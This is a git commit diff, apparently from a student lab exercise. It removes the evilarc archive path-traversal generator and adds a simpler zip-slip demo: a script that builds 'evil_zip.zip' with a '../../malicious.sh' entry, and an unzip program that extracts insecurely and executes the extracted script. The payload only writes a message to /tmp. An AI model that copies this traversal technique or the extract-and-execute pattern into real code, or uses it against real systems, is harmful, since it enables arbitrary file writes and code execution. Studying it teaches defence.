3573dcf9cdcb615b3b0a9406f6f7ff174721dd89
alexis.laurent <alexis.laurent@etu.uca.fr>
2024-10-01 10:35:29 +0200

    test

--- Create_EvilZip.py
+++ Create_EvilZip.py
@@ -1,62 +1,19 @@
-import sys, zipfile, tarfile, os, optparse
+import zipfile
+import os
 
-def main(argv=sys.argv):
-	p = optparse.OptionParser(description = 'Create archive containing a file with directory traversal', 
-								prog = 'evilarc',
-								version = '0.1',
-								usage = '%prog <input file>')
-	p.add_option('--output-file', '-f', dest="out", help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.")
-	p.set_default("out", "evil.zip")
-	p.add_option('--depth', '-d', type="int", dest="depth", help="Number directories to traverse. Defaults to 8.")
-	p.set_default("depth", 8)
-	p.add_option('--os', '-o', dest="platform", help="OS platform for archive (win|unix). Defaults to win.")
-	p.set_default("platform", "win")
-	p.add_option('--path', '-p', dest="path", help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")	
-	p.set_default("path", "")
-	options, arguments = p.parse_args()
-	
-	if len(arguments) != 1:
-		p.error("Incorrect arguments")
-		
-	fname = arguments[0]
-	if not os.path.exists(fname):
-		sys.exit("Invalid input file")
-		
-	if options.platform == "win":
-		dir = "..\\"
-		if options.path and options.path[-1] != '\\':
-			options.path += '\\'
-	else:
-		dir = "../"
-		if options.path and options.path[-1] != '/':
-			options.path += '/'
+# Créer un répertoire temporaire pour le fichier à zipper
+os.makedirs('evil', exist_ok=True)
 
-	zpath = dir*options.depth+options.path+os.path.basename(fname)
-	print ("Creating " + options.out + " containing " + zpath);	
-	ext = os.path.splitext(options.out)[1]
-	if os.path.exists(options.out):
-		wmode = 'a'
-	else:
-		wmode = 'w'
-	if ext == ".zip" or ext == ".jar":
-		zf = zipfile.ZipFile(options.out, wmode)
-		zf.write(fname, zpath)
-		zf.close()
-		return
-	elif ext == ".tar":
-		mode = wmode
-	elif ext == ".gz" or ext == ".tgz":
-		mode = "w:gz"
-	elif ext == ".bz2":
-		mode = "w:bz2"
-	else:
-		sys.exit("Could not identify output archive format for " + ext)
+# Créer un script Bash malveillant
+with open('evil/../../malicious.sh', 'w') as f:
+    f.write("#!/bin/bash\n")
+    f.write('echo "Je t\'ai bien eu!" > /tmp/hacked.txt\n')
 
-	tf = tarfile.open(options.out, mode)
-	tf.add(fname, zpath)
-	tf.close()
+# Rendre le script exécutable
+os.chmod('evil/../../malicious.sh', 0o755)
 
+# Créer le fichier ZIP avec le script piégé
+with zipfile.ZipFile('evil_zip.zip', 'w') as zipf:
+    zipf.write('evil/../../malicious.sh', arcname='../../malicious.sh')
 
-
-if __name__ == '__main__':
-     main()
+print("Fichier ZIP piégé créé avec script Bash : evil_zip.zip")
--- UnZip_program.py
+++ UnZip_program.py
@@ -1,8 +1,17 @@
 import zipfile
 import os
-import sys
+import subprocess
 
-def unzip_file(zip_file, extract_to):
-    zipfile.ZipFile(zip_file, 'r').extractall(extract_to)
+def unzip_and_execute(zip_path, extract_path):
+    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+        zip_ref.extractall(extract_path)
+    
+    # Vérifier si un script malveillant a été extrait et l'exécuter
+    malicious_script_path = os.path.join(extract_path, 'malicious.sh')
+    if os.path.exists(malicious_script_path):
+        print(f"Exécution du script malveillant : {malicious_script_path}")
+        subprocess.run([malicious_script_path], shell=True)
 
-unzip_file(sys.argv[1], './')
+# Exemple d'utilisation
+unzip_and_execute('evil_zip.zip', 'unzipped')
+print("Extraction non sécurisée avec exécution terminée")
